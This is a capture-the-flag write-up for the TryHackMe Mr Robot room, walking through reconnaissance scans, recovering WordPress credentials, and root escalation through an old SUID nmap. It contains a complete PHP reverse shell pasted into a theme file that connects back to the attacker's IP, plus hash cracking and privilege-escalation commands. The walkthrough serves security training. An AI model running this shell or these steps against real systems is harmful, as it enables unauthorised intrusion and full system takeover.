# Mr Robot Ctf

---
Date: 2021-12-21  
Author: Michael Baumberger  
[TryHackMe link](https://tryhackme.com/room/mrrobot)

---

# Task 2 | Hack the machine

First we scan the server with nmap, nikto and dirbuster:

````
nmap -sC -sV -p- 10.10.48.240
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-21 19:12 CET
Nmap scan report for 10.10.48.240
Host is up (0.071s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache

Nmap done: 1 IP address (1 host up) scanned in 338.05 seconds
````

And we run nikto:

````
nikto -h 10.10.48.240
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.48.240
+ Target Hostname:    10.10.48.240
+ Target Port:        80
+ Start Time:         2021-12-21 19:12:40 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /readme: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://10.10.48.240/?p=23>; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /wordpresswp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ /wordpresswp-login.php: Wordpress login found
+ 7890 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2021-12-21 20:09:14 (GMT1) (3394 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
````

And dirbuster:

````
dirb http://10.10.48.240

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue Dec 21 19:12:19 2021
URL_BASE: http://10.10.48.240/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.48.240/ ----
==> DIRECTORY: http://10.10.48.240/0/
==> DIRECTORY: http://10.10.48.240/admin/
+ http://10.10.48.240/atom (CODE:301|SIZE:0)
==> DIRECTORY: http://10.10.48.240/audio/
==> DIRECTORY: http://10.10.48.240/blog/
==> DIRECTORY: http://10.10.48.240/css/
+ http://10.10.48.240/dashboard (CODE:302|SIZE:0)
+ http://10.10.48.240/favicon.ico (CODE:200|SIZE:0)
==> DIRECTORY: http://10.10.48.240/feed/
==> DIRECTORY: http://10.10.48.240/image/
==> DIRECTORY: http://10.10.48.240/Image/
==> DIRECTORY: http://10.10.48.240/images/
+ http://10.10.48.240/index.html (CODE:200|SIZE:1188)
+ http://10.10.48.240/index.php (CODE:301|SIZE:0)
+ http://10.10.48.240/intro (CODE:200|SIZE:516314)
==> DIRECTORY: http://10.10.48.240/js/
+ http://10.10.48.240/license (CODE:200|SIZE:309)
+ http://10.10.48.240/login (CODE:302|SIZE:0)
+ http://10.10.48.240/page1 (CODE:301|SIZE:0)
+ http://10.10.48.240/phpmyadmin (CODE:403|SIZE:94)
+ http://10.10.48.240/rdf (CODE:301|SIZE:0)
+ http://10.10.48.240/readme (CODE:200|SIZE:64)
+ http://10.10.48.240/robots (CODE:200|SIZE:41)
+ http://10.10.48.240/robots.txt (CODE:200|SIZE:41)
+ http://10.10.48.240/rss (CODE:301|SIZE:0)
+ http://10.10.48.240/rss2 (CODE:301|SIZE:0)
+ http://10.10.48.240/sitemap (CODE:200|SIZE:0)
+ http://10.10.48.240/sitemap.xml (CODE:200|SIZE:0)
==> DIRECTORY: http://10.10.48.240/video/
==> DIRECTORY: http://10.10.48.240/wp-admin/
+ http://10.10.48.240/wp-config (CODE:200|SIZE:0)
==> DIRECTORY: http://10.10.48.240/wp-content/
+ http://10.10.48.240/wp-cron (CODE:200|SIZE:0)
==> DIRECTORY: http://10.10.48.240/wp-includes/
+ http://10.10.48.240/wp-links-opml (CODE:200|SIZE:227)
+ http://10.10.48.240/wp-load (CODE:200|SIZE:0)
+ http://10.10.48.240/wp-login (CODE:200|SIZE:2606)
+ http://10.10.48.240/wp-mail (CODE:500|SIZE:3064)
+ http://10.10.48.240/wp-settings (CODE:500|SIZE:0)
+ http://10.10.48.240/wp-signup (CODE:302|SIZE:0)
+ http://10.10.48.240/xmlrpc (CODE:405|SIZE:42)
+ http://10.10.48.240/xmlrpc.php (CODE:405|SIZE:42)

---- Entering directory: http://10.10.48.240/0/ ----
^C
````

From the nmap scan we get that port 22 ssh and apache listening to port 80 http and 443 https.

The dirbuster scan gives us many results but for the start we should keep in mind this pages:

- http://10.10.48.240/admin
- http://10.10.48.240/robots
- http://10.10.48.240/wp-admin
- http://10.10.48.240/phpmyadmin

Many other pages look like they are generated from wordpress.

We first look at the http://10.10.48.240/robots and see an entry called 'key-1-of-3.txt'.
If we try to get this file with **http://10.10.48.240/key-1-of-3.txt we get our first flag**.

From the nikto scan we get the interesting urls '/admin' and '/readme' witch we should look at.
And we also get the information that in the file '/wp-links-opml.php' the *wordpress version 4.3.1* is leeked:

````xml
<opml version="1.0">
    <head>
        <title>Links for user's Blog!</title>
        <dateCreated>Tue, 21 Dec 2021 19:00:50 GMT</dateCreated>
        <!--  generator="WordPress/4.3.1"  -->
    </head>
    <body> </body>
</opml>
````

We could search for exploits for this version, but I found the license file which contains a message:

```
curl -s http://10.10.176.240/license | tr -d "\n"
what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?do you want a password or something?ZWxsaW90OkVSMjgtMDY1Mgo=
```

The ending '=' says that it could be a base64 encoded string:

````
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
elliot:ER28-0652
````

now we can go to the wordpress login under '/wp-login' and try the credentials. As we see it works!  
Because we are an admin user we can go under 'Appearance > Editor' and edit the '404.php' on the right side.  
First we start a netcat listener on port 4000:

````shell
nc -nlvp 4000
listening on [any] 4000 ...
````

And we paste the reverse shell into the 404.php site:

````php
set_time_limit (0);
$VERSION 	= "1.0";
$ip 		= '10.9.205.135'; 	// Change Your {IP}
$port 		= 4000;       	// Change Your {Port}
$chunk_size 	= 1400;
$write_a 	= null;
$error_a 	= null;
$shell 		= 'uname -a; w; id; /bin/sh -i';
$daemon 	= 0;
$debug 		= 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	if ($pid) {
		exit(0);
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}
	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
````

and now we should have a reverse shell in our netcat listener:

````
c -nlvp 4000
listening on [any] 4000 ...
connect to [10.9.205.135] from (UNKNOWN) [10.10.176.240] 38545
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 13:13:08 up 31 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
````

We can now go into the home of the user robot and find the file 'key-2-of-3.txt'.  
But we can not open it because we are the user deamon and not the user robot.  
In the same folder we also find the file 'password.raw-md5'. The file contains:

````
robot:c3fcd3d76192e4007dfb496cca67e13b
````

We can use John the Ripper to crack the hash, or we can find the hash somewhere like here:  
https://md5.gromweb.com/?md5=c3fcd3d76192e4007dfb496cca67e13b  

Whe password for the user 'robot' is 'abcdefghijklmnopqrstuvwxyz'.

we can now try to log in as that user and read the flag, but it doesn't work??

````
$ su robot
su: must be run from a terminal
````

No problem. Lets see if we have python and then spawn a shell:

````
$ which python
/usr/bin/python
$ python -c 'import pty; pty.spawn("/bin/sh")'
$
````

And now log in:

````
$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$
````

Now we can read the file and **collect the flag 2 of 3**!!

For flag 3 it is likely that we have to be root and elevate our privileges.  
Lets try it with:

````
obot@linux:~$ sudo -l
sudo -l
[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.
````

OK, let’s find what programs we have with the SETUID bit set owned by root:

````
find / -user root -perm -4000 -print 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
````

Lets see what version nmap has, because in very old versions from 2.02 to 5.21 there was an interactive mode:

````
nmap --version            

nmap version 3.81 ( http://www.insecure.org/nmap/ )
````

It is a very old version. My installed version is 7.92.  
We now know that we can elevate our privileges with nmap:

````
robot@linux:/$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !whoami
!whoami
root
waiting to reap child : No child processes
nmap> 
````

Now we habe root privileges and can read the flag in the file key-3-of-3.txt:

````
nmap> !ls /root
!ls /root
firstboot_done	key-3-of-3.txt
waiting to reap child : No child processes
nmap> !cat /root/key-3-of-3.txt
!cat /root/key-3-of-3.txt
SomeFlagButFindItByYourself
waiting to reap child : No child processes
nmap>
````

